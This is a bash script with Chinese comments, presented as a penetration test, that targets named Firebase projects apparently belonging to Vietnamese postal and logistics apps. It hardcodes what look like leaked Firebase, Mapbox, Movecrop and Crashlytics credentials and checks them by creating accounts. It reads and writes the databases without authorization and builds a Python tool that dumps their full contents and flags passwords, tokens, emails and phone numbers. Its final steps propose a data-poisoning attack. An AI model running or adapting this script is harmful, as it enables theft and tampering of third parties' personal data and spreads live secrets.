#!/bin/bash
# Firebase + API密钥完整测试脚本
# 目标: 7个Firebase项目 + 9个API密钥

WORK_DIR="/workspace/firebase_test"
mkdir -p $WORK_DIR && cd $WORK_DIR

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 Firebase + API密钥渗透测试"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# ============ Firebase API Keys ============
echo ""
echo "[*] 阶段1: Firebase API Key测试..."

FIREBASE_KEYS=(
    "AIzaSyA41iXW4LfAjCDULLDgwA-zSYFfS_h_Cro"
    "AIzaSyC6DHBatj4ypbxhFNFhu0_fKssg50pX1ig"
    "AIzaSyD6C4LdceVok8mCH-4ykyoTLBKHv2hrtbc"
    "AIzaSyDTOEeScCiXjH33IXBC_fKzTP7tX3aZpOY"
    "AIzaSyDzWrNQGF8yUFktvbwxR5V5d4w3v04TIP0"
)

FIREBASE_PROJECTS=(
    "csdl-kh"
    "dingdong-1524126013190"
    "dingdong-3e5cb"
    "ems-khl-app-notify"
    "my-vnpost"
    "viettel-post-8cb80"
    "viettelpost-evtman"
)

echo "[*] 1.1 测试Firebase API Key有效性..."
for key in "${FIREBASE_KEYS[@]}"; do
    echo "[*] 测试Key: ${key:0:20}..."
    
    # 测试Firebase REST API
    response=$(curl -s "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=$key" \
        -H "Content-Type: application/json" \
        -d '{"email":"test@test.com","password":"test123","returnSecureToken":true}')
    
    if echo "$response" | grep -qiE "idToken|refreshToken"; then
        echo "  [✅] Key有效 - 可创建账户"
        echo "$key|VALID|$response" >> firebase_valid_keys.txt
    elif echo "$response" | grep -qi "EMAIL_EXISTS"; then
        echo "  [✅] Key有效 - 邮箱已存在"
        echo "$key|VALID" >> firebase_valid_keys.txt
    elif echo "$response" | grep -qi "API_KEY_INVALID"; then
        echo "  [❌] Key无效"
    else
        echo "  [?] 未知响应: $(echo $response | head -c 100)"
    fi
done

echo ""
echo "[*] 1.2 测试Firebase Database未授权访问..."

for project in "${FIREBASE_PROJECTS[@]}"; do
    url="https://${project}.firebaseio.com/.json"
    echo "[*] 测试: $project"
    
    # 尝试读取根路径
    response=$(curl -s "$url" -m 10)
    
    if [ "$response" != "null" ] && [ "$response" != "Permission denied" ] && [ -n "$response" ]; then
        echo "  [✅] 可未授权读取！"
        echo "$project" >> firebase_unauth.txt
        echo "$response" > "firebase_data_${project}.json"
    elif echo "$response" | grep -q "Permission denied"; then
        echo "  [❌] 权限拒绝（配置正确）"
    else
        echo "  [ℹ️] 空数据或其他"
    fi
    
    # 尝试写入测试
    write_response=$(curl -s "${url}/test.json" -X PUT \
        -d '{"test":"value"}' -m 10)
    
    if echo "$write_response" | grep -q "test"; then
        echo "  [🚨] 可未授权写入！极度危险！"
        echo "$project|WRITE" >> firebase_unauth_write.txt
    fi
done

# ============ Mapbox Token测试 ============
echo ""
echo "[*] 阶段2: Mapbox Access Token测试..."

MAPBOX_TOKENS=(
    "pk.eyJ1IjoiaG9hbmdtYW5oMTkwOSIsImEiOiJjazczMjZhYTUwNGRxM2VxdzBhdWxqZmg0In0.bS71h7OOLd1OobSajeMQ9g"
    "pk.eyJ1IjoiY2FrYS1pY3QiLCJhIjoiY2s3dmpxNTg4MGd4ODNsbzJkbmNlN2NuMSJ9.KVwFbPxuaBPlXuEIIpOEZA"
)

for token in "${MAPBOX_TOKENS[@]}"; do
    echo "[*] 测试Token: ${token:0:30}..."
    
    # 测试地理编码API
    response=$(curl -s "https://api.mapbox.com/geocoding/v5/mapbox.places/Hanoi.json?access_token=$token")
    
    if echo "$response" | grep -q "features"; then
        echo "  [✅] Token有效"
        echo "$token|VALID" >> mapbox_valid_tokens.txt
        
        # 获取Token统计
        stats=$(curl -s "https://api.mapbox.com/tokens/v2?access_token=$token")
        echo "  Stats: $stats" >> mapbox_stats.txt
    else
        echo "  [❌] Token无效或受限"
    fi
done

# ============ Movecrop API Key测试 ============
echo ""
echo "[*] 阶段3: Movecrop API Key测试..."

MOVECROP_KEY="3e058ce3027e6c473a6d47e5f253c480"
MOVECROP_SECRET="7409f5b12daff2f0b8df56f6b4faf151"
MOVECROP_FULL="${MOVECROP_KEY}:${MOVECROP_SECRET}"

echo "[*] 测试Movecrop API..."

# 测试开发环境API
response=$(curl -s "https://api-development.movecrop.com/v1/auth" \
    -H "Authorization: Basic $(echo -n $MOVECROP_FULL | base64)" \
    -H "Content-Type: application/json")

if echo "$response" | grep -qiE "token|success"; then
    echo "  [✅] Movecrop Key有效"
    echo "$MOVECROP_FULL|$response" >> movecrop_valid.txt
else
    echo "  [?] 响应: $(echo $response | head -c 100)"
fi

# ============ Crashlytics Token测试 ============
echo ""
echo "[*] 阶段4: Crashlytics Token测试..."

CRASHLYTICS_TOKEN="470fa2b4ae81cd56ecbcda9735803434cec591fa"

# 尝试访问Crashlytics API
response=$(curl -s "https://e.crashlytics.com/spi/v2/events" \
    -H "X-CRASHLYTICS-DEVELOPER-TOKEN: $CRASHLYTICS_TOKEN")

if [ -n "$response" ]; then
    echo "  [✅] Token可能有效"
    echo "$CRASHLYTICS_TOKEN|$response" >> crashlytics_test.txt
fi

# ============ 自动化利用工具 ============
echo ""
echo "[*] 生成自动化利用工具..."

cat > firebase_dumper.py << 'PYEOF'
#!/usr/bin/env python3
"""
Firebase完整数据导出工具
"""
import requests
import json
import sys

def dump_firebase(project_name, output_file):
    url = f"https://{project_name}.firebaseio.com/.json"
    print(f"[*] 尝试导出: {project_name}")
    
    try:
        response = requests.get(url, timeout=30)
        
        if response.status_code == 200 and response.text != "null":
            data = response.json()
            
            with open(output_file, 'w') as f:
                json.dump(data, f, indent=2)
            
            print(f"[✅] 成功导出到: {output_file}")
            print(f"    数据大小: {len(response.text)} bytes")
            
            # 分析敏感字段
            sensitive_found = []
            json_str = json.dumps(data).lower()
            
            keywords = ['password', 'token', 'secret', 'key', 'email', 'phone']
            for keyword in keywords:
                if keyword in json_str:
                    sensitive_found.append(keyword)
            
            if sensitive_found:
                print(f"[⚠️] 发现敏感字段: {', '.join(sensitive_found)}")
            
            return True
        else:
            print(f"[❌] 无法访问或无数据")
            return False
            
    except Exception as e:
        print(f"[❌] 错误: {e}")
        return False

if __name__ == "__main__":
    projects = [
        "csdl-kh",
        "dingdong-1524126013190",
        "dingdong-3e5cb",
        "ems-khl-app-notify",
        "my-vnpost",
        "viettel-post-8cb80",
        "viettelpost-evtman"
    ]
    
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("🔥 Firebase数据导出工具")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print()
    
    success = 0
    for project in projects:
        if dump_firebase(project, f"dump_{project}.json"):
            success += 1
        print()
    
    print(f"✅ 成功导出 {success}/{len(projects)} 个项目")
PYEOF

chmod +x firebase_dumper.py

echo "  [✅] 已生成: firebase_dumper.py"

# ============ 结果汇总 ============
echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📊 密钥测试结果"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "Firebase有效Key: $(cat firebase_valid_keys.txt 2>/dev/null | wc -l)"
echo "Firebase未授权读: $(cat firebase_unauth.txt 2>/dev/null | wc -l)"
echo "Firebase未授权写: $(cat firebase_unauth_write.txt 2>/dev/null | wc -l)"
echo "Mapbox有效Token: $(cat mapbox_valid_tokens.txt 2>/dev/null | wc -l)"
echo "Movecrop有效: $(cat movecrop_valid.txt 2>/dev/null | wc -l)"
echo ""
echo "📁 结果文件:"
echo "  - firebase_valid_keys.txt"
echo "  - firebase_unauth.txt"
echo "  - firebase_unauth_write.txt (🚨 如果有则极危险)"
echo "  - firebase_data_*.json"
echo "  - mapbox_valid_tokens.txt"
echo "  - movecrop_valid.txt"
echo "  - firebase_dumper.py (自动导出工具)"
echo ""
echo "🎯 下一步："
echo "  1. 运行: python3 firebase_dumper.py"
echo "  2. 检查导出的敏感数据"
echo "  3. 如有写权限，可进行数据投毒攻击"
echo ""
echo "✅ 测试完成！"
